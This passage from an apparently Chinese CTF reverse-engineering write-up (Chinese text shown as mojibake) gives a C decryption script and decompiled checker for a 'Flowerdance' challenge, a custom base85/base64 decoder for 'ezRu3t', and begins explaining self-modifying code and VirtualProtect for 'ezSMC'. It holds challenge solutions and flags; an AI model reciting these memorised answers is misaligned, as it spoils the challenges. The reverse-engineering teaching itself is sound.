</span></span><span class="line"><span class="cl">        <span class="c1">// æ­¥éª¤2: é€†å‘å¾ªç¯å·¦ç§» (ä½¿ç”¨å¾ªç¯å³ç§»)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kt">uint8_t</span> <span class="n">shift_amount</span> <span class="o">=</span> <span class="n">KEY</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="n">key_len</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mi">7</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="kt">uint8_t</span> <span class="n">temp2</span> <span class="o">=</span> <span class="nf">ror8</span><span class="p">(</span><span class="n">temp1</span><span class="p">,</span> <span class="n">shift_amount</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="c1">// æ­¥éª¤3: é€†å‘å¼‚æˆ–
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">in</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">temp2</span> <span class="o">^</span> <span class="n">KEY</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="n">key_len</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// å¯†æ–‡æ•°æ®
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">uint8_t</span> <span class="n">CIPHER</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="mh">0x0A</span><span class="p">,</span> <span class="mh">0x84</span><span class="p">,</span> <span class="mh">0xC2</span><span class="p">,</span> <span class="mh">0x84</span><span class="p">,</span> <span class="mh">0x51</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x5F</span><span class="p">,</span> <span class="mh">0xF2</span><span class="p">,</span> <span class="mh">0x9E</span><span class="p">,</span> <span class="mh">0x8D</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mh">0xD0</span><span class="p">,</span> <span class="mh">0x84</span><span class="p">,</span> <span class="mh">0x75</span><span class="p">,</span> <span class="mh">0x67</span><span class="p">,</span> <span class="mh">0x73</span><span class="p">,</span> <span class="mh">0x8F</span><span class="p">,</span> <span class="mh">0xCA</span><span class="p">,</span> <span class="mh">0x57</span><span class="p">,</span> <span class="mh">0xD7</span><span class="p">,</span> <span class="mh">0xE6</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mh">0x14</span><span class="p">,</span> <span class="mh">0x6E</span><span class="p">,</span> <span class="mh">0x77</span><span class="p">,</span> <span class="mh">0xE2</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0xFE</span><span class="p">,</span> <span class="mh">0xDF</span><span class="p">,</span> <span class="mh">0xCC</span>
</span></span><span class="line"><span class="cl">    <span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="kt">size_t</span> <span class="n">CIPHER_LEN</span> <span class="o">=</span> <span class="mi">28</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1">// å¯†é’¥ï¼ˆéœ€è¦æ ¹æ®å®é™…æƒ…å†µä¿®æ”¹ï¼‰
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">KEY</span> <span class="o">=</span> <span class="s">&#34;GEEK2025&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1">// å­˜å‚¨è§£å¯†ç»“æœ
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">uint8_t</span> <span class="n">decrypted</span><span class="p">[</span><span class="n">CIPHER_LEN</span> <span class="o">+</span> <span class="mi">1</span><span class="p">];</span>  <span class="c1">// +1 ç”¨äºå­—ç¬¦ä¸²ç»“æŸç¬¦
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">memset</span><span class="p">(</span><span class="n">decrypted</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">decrypted</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1">// è§£å¯†
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">decrypt</span><span class="p">(</span><span class="n">CIPHER</span><span class="p">,</span> <span class="n">decrypted</span><span class="p">,</span> <span class="n">CIPHER_LEN</span><span class="p">,</span> <span class="n">KEY</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1">// è¾“å‡ºç»“æœ
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Decrypted data (hex): &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">CIPHER_LEN</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%02X &#34;</span><span class="p">,</span> <span class="n">decrypted</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Decrypted text: &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">CIPHER_LEN</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%c&#34;</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="n">decrypted</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>è¿è¡Œå¾—åˆ°ç»“æœSYC{asdjjasdhjk12wk12ijkejk}</li>
<li>é™„ä¿®å®Œä¹‹åçš„mainå‡½æ•°</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">Buffer</span><span class="p">[</span><span class="mi">264</span><span class="p">];</span> <span class="c1">// [esp+14h] [ebp-10Ch] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">size_t</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// [esp+11Ch] [ebp-4h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="nf">__main</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Welcome to Flowerdance. Input your flag: &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="nf">fgets</span><span class="p">(</span><span class="n">Buffer</span><span class="p">,</span> <span class="mi">256</span><span class="p">,</span> <span class="p">(</span><span class="n">FILE</span> <span class="o">*</span><span class="p">)</span><span class="n">__iob</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">_ptr</span><span class="p">)</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">v2</span> <span class="o">=</span> <span class="nf">strlen</span><span class="p">(</span><span class="n">Buffer</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">v2</span> <span class="o">&amp;&amp;</span> <span class="n">Buffer</span><span class="p">[</span><span class="n">v2</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="mi">10</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">Buffer</span><span class="p">[</span><span class="o">--</span><span class="n">v2</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="nf">checkcheck</span><span class="p">(</span><span class="n">Buffer</span><span class="p">)</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">Buffer</span><span class="p">[</span><span class="mi">260</span><span class="p">]</span> <span class="o">=</span> <span class="nf">strlen</span><span class="p">(</span><span class="n">Buffer</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">Buffer</span><span class="p">[</span><span class="mi">260</span><span class="p">]</span> <span class="o">==</span> <span class="mi">28</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">Buffer</span><span class="p">[</span><span class="mi">256</span><span class="p">]</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="mh">0x1Cu</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">Buffer</span><span class="p">[</span><span class="mi">256</span><span class="p">]</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">encrypt</span><span class="p">((</span><span class="k">const</span> <span class="kt">uint8_t</span> <span class="o">*</span><span class="p">)</span><span class="n">Buffer</span><span class="p">,</span> <span class="o">*</span><span class="p">(</span><span class="kt">uint8_t</span> <span class="o">**</span><span class="p">)</span><span class="o">&amp;</span><span class="n">Buffer</span><span class="p">[</span><span class="mi">256</span><span class="p">],</span> <span class="o">*</span><span class="p">(</span><span class="kt">size_t</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">Buffer</span><span class="p">[</span><span class="mi">260</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="nf">memcmp</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="k">const</span> <span class="kt">void</span> <span class="o">**</span><span class="p">)</span><span class="o">&amp;</span><span class="n">Buffer</span><span class="p">[</span><span class="mi">256</span><span class="p">],</span> <span class="n">CIPHER</span><span class="p">,</span> <span class="o">*</span><span class="p">(</span><span class="kt">size_t</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">Buffer</span><span class="p">[</span><span class="mi">260</span><span class="p">])</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Correct! Flowerdance!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Incorrect. Keep dancing.&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">          <span class="nf">hint</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="nf">free</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">void</span> <span class="o">**</span><span class="p">)</span><span class="o">&amp;</span><span class="n">Buffer</span><span class="p">[</span><span class="mi">256</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="k">else</span>
</span></span><span class="line"><span class="cl">      <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Wrong length (expected %lu bytes including braces).</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="mi">28</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="nf">hint</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">else</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Bad format..&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">hint</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="4ezru3t">4.ezRu3t
</h3><ul>
<li>
<p>ä¸€ç›´è§‚å¯Ÿå¹¶ç»“åˆstringè¡¨ä¸­çš„ä¸¤ä¸ªæ˜ å°„è¡¨å¯çŸ¥ï¼Œæœ‰ä¸€ä¸ªbase64ï¼Œä¸€ä¸ªbase85ï¼Œå†çœ‹é¡ºåºæ˜¯å…ˆ64åœ¨85ï¼Œå¹¶æ— å…¶ä»–åŠ å¯†æ‰€ä»¥ç›´æ¥è§£å¯†å¯å¾—</p>
</li>
<li>
<p>64è¡¨:ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/
85è¡¨ï¼š!&quot;#$%&amp;&rsquo;()*+,-./0123456789&lt;=&gt;@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstu</p>
<p>å¯†æ–‡ï¼š&lt;AA;XAM?,_@;T[r@7E779h8;s&gt;&rsquo;`pt=&gt;3c6ASuHFASOtP&lt;Gkf_A4&amp;gPAl1]S</p>
</li>
<li>
<p>base85è§£å¯†</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">struct</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>  <span class="c1"># æ·»åŠ å¯¼å…¥</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">base85_decode</span><span class="p">(</span><span class="n">encoded_str</span><span class="p">,</span> <span class="n">custom_table</span><span class="o">=</span><span class="kc">None</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;ç®€åŒ–çš„Base85è§£å¯†å‡½æ•°&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">custom_table</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">custom_table</span> <span class="o">=</span> <span class="s2">&#34;!</span><span class="se">\&#34;</span><span class="s2">#$%&amp;&#39;()*+,-./0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[</span><span class="se">\\</span><span class="s2">]^_`abcdefghijklmnopqrstu&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># åˆ›å»ºå­—ç¬¦åˆ°ç´¢å¼•çš„æ˜ å°„</span>
</span></span><span class="line"><span class="cl">    <span class="n">char_map</span> <span class="o">=</span> <span class="p">{</span><span class="n">char</span><span class="p">:</span> <span class="n">i</span> <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">char</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">custom_table</span><span class="p">)}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># æ¸…ç†è¾“å…¥å­—ç¬¦ä¸²</span>
</span></span><span class="line"><span class="cl">    <span class="n">encoded_str</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">sub</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;\s+&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="n">encoded_str</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">encoded_str</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s1">&#39;&lt;~&#39;</span><span class="p">)</span> <span class="ow">and</span> <span class="n">encoded_str</span><span class="o">.</span><span class="n">endswith</span><span class="p">(</span><span class="s1">&#39;~&gt;&#39;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">encoded_str</span> <span class="o">=</span> <span class="n">encoded_str</span><span class="p">[</span><span class="mi">2</span><span class="p">:</span><span class="o">-</span><span class="mi">2</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># å¤„ç†è§£ç </span>
</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">n</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="n">count</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">encoded_str</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">char</span> <span class="o">==</span> <span class="s1">&#39;z&#39;</span> <span class="ow">and</span> <span class="n">count</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">result</span><span class="o">.</span><span class="n">extend</span><span class="p">([</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">            <span class="k">continue</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">n</span> <span class="o">=</span> <span class="n">n</span> <span class="o">*</span> <span class="mi">85</span> <span class="o">+</span> <span class="n">char_map</span><span class="p">[</span><span class="n">char</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="n">count</span> <span class="o">+=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">count</span> <span class="o">==</span> <span class="mi">5</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">result</span><span class="o">.</span><span class="n">extend</span><span class="p">(</span><span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&gt;I&#39;</span><span class="p">,</span> <span class="n">n</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">            <span class="n">n</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">            <span class="n">count</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># å¤„ç†æœ€åçš„å—</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">count</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">n</span> <span class="o">*=</span> <span class="mi">85</span> <span class="o">**</span> <span class="p">(</span><span class="mi">5</span> <span class="o">-</span> <span class="n">count</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">result</span><span class="o">.</span><span class="n">extend</span><span class="p">(</span><span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&gt;I&#39;</span><span class="p">,</span> <span class="n">n</span><span class="p">)[:</span><span class="n">count</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">result</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">,</span> <span class="n">errors</span><span class="o">=</span><span class="s1">&#39;ignore&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># ä½¿ç”¨</span>
</span></span><span class="line"><span class="cl"><span class="n">encoded_text</span> <span class="o">=</span> <span class="s2">&#34;&lt;AA;XAM?,_@;T[r@7E779h8;s&gt;&#39;`pt=&gt;3c6ASuHFASOtP&lt;Gkf_A4&amp;gPAl1]S&#34;</span>  <span class="c1"># æ›¿æ¢ä¸ºå®é™…å­—ç¬¦ä¸²</span>
</span></span><span class="line"><span class="cl"><span class="n">decoded_text</span> <span class="o">=</span> <span class="n">base85_decode</span><span class="p">(</span><span class="n">encoded_text</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">decoded_text</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#ç»“æœU1lDe09oamhoaF95MHVfZzN0X0V6enp6ejNfUnUzdCFAfQ==</span>
</span></span></code></pre></td></tr></table>
</div>
</div></li>
<li>
<p>ç¬¦åˆbase64çš„æ ¼å¼åœ¨è§£å¯†å¯å¾—SYC{Ohjhhh_y0u_g3t_Ezzzzz3_Ru3t!@}</p>
</li>
</ul>
<h3 id="5ezsmc">5.ezSMC
</h3><ul>
<li><strong>å‰ç½®çŸ¥è¯†</strong>ï¼š<strong>CTFä¸­SMC</strong></li>
</ul>
<p>ç®€è¦æ¥è¯´å°±æ˜¯ä¸€æ®µæ­£å¸¸çš„ä»£ç ,é€šè¿‡åŠ å¯†è¿‡ç¨‹,ä½¿ç¨‹åºå˜å¾—æ··ä¹±,ä»è€Œè®©IDAç­‰åç¼–è¯‘å·¥å…·æ— æ³•è¯†åˆ«
(å¹¿ä¹‰ä¸Šå¯ä»¥ç†è§£ä¸ºç¨‹åºä¿æŠ¤å£³å§)
ä¸€èˆ¬å¸¸è§çš„ä¸ºå¼‚æˆ–åŠ å¯†
åŒæ—¶ä¸€èˆ¬ä¼´éšç€SMCå‡ºç°çš„è¿˜æœ‰
VirtualProtect
VirtualProtect æ˜¯ Windows æ“ä½œç³»ç»Ÿä¸­çš„ä¸€ä¸ª API å‡½æ•°ï¼Œå®ƒå…è®¸åº”ç”¨ç¨‹åºæ”¹å˜ä¸€ä¸ªå†…å­˜é¡µçš„ä¿æŠ¤å±æ€§ã€‚è¿™ä¸ªå‡½æ•°çš„åŸå‹å¦‚ä¸‹ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">BOOL VirtualProtect(
</span></span><span class="line"><span class="cl">  LPCVOID lpAddress,  // è¦æ”¹å˜ä¿æŠ¤å±æ€§çš„å†…å­˜é¡µçš„èµ·å§‹åœ°å€
</span></span><span class="line"><span class="cl">  SIZE_T dwSize,      // å†…å­˜é¡µçš„å¤§å°
</span></span><span class="line"><span class="cl">  DWORD flNewProtect, // æ–°çš„ä¿æŠ¤å±æ€§
</span></span><span class="line"><span class="cl">  PDWORD lpflOldProtect // å­˜å‚¨æ—§çš„ä¿æŠ¤å±æ€§
</span></span><span class="line"><span class="cl">);
</span></span></code></pre></td></tr></table>
</div>
</div><p>é€†å‘åˆ†æä¸­ï¼ŒVirtualProtect å‡½æ•°é€šå¸¸ç”¨äºä»£ç è‡ªåŠ å¯†çš„åœºæ™¯ã€‚ä»£ç è‡ªåŠ å¯†æ˜¯ä¸€ç§ä¿æŠ¤ä»£ç ä¸è¢«è½»æ˜“é€†å‘åˆ†æçš„æŠ€æœ¯ï¼Œé€šè¿‡åœ¨ç¨‹åºè¿è¡Œæ—¶åŠ¨æ€åœ°ä¿®æ”¹ä»£ç çš„å†…å­˜ä¿æŠ¤å±æ€§ï¼Œä½¿å¾—ä»£ç åœ¨æ‰§è¡Œæ—¶å¯ä»¥è¢«ä¿®æ”¹å’Œæ‰§è¡Œï¼Œä½†åœ¨ä¸æ‰§è¡Œæ—¶åˆ™ä¸èƒ½è¢«è¯»å–æˆ–ä¿®æ”¹</p>
<ul>
<li>æ‰“å¼€idaè§‚å¯Ÿmainå‡½æ•°</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
